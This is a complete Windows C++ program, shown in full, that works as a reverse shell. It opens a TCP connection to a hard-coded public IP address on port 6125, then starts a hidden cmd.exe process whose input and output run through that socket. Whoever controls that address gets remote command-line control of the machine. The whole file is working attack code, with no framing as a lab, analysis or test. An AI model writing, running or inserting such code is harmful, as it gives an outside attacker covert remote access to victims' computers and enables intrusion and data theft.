#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

int main() {
    string ip = "13.213.59.249";
    short port = 6125;

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed with error: %d\n", WSAGetLastError());
        return 1;
    }

    // Create socket
    SOCKET WSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
    if (WSock == INVALID_SOCKET) {
        printf("Socket creation failed with error: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Set up connection details
    struct sockaddr_in hax;
    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip.c_str());

    // Connect to remote host
    if (WSAConnect(WSock, (SOCKADDR*)&hax, sizeof(hax), nullptr, nullptr, nullptr, nullptr) != 0) {
        printf("Connection failed with error: 0x%x\n", GetLastError());
        closesocket(WSock);
        WSACleanup();
        return 1;
    }

    printf("Connection established successfully\n");

    // Set up process creation
    STARTUPINFOA sui;
    PROCESS_INFORMATION pi;
    ZeroMemory(&sui, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)WSock;

    // Create cmd.exe process
    string process = "cmd.exe";
    if (CreateProcessA(nullptr, 
                      (LPSTR)process.c_str(), 
                      nullptr, 
                      nullptr, 
                      TRUE, 
                      CREATE_NO_WINDOW, 
                      nullptr, 
                      nullptr, 
                      &sui, 
                      &pi)) {
        printf("Process created successfully\n");
        cout << "Process ID: " << pi.dwProcessId << endl;
        
        // Wait for the process to finish
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Clean up process handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        printf("CreateProcess failed with error: %d\n", GetLastError());
        closesocket(WSock);
        WSACleanup();
        return 1;
    }

    // Clean up Winsock
    closesocket(WSock);
    WSACleanup();

    return 0;
}
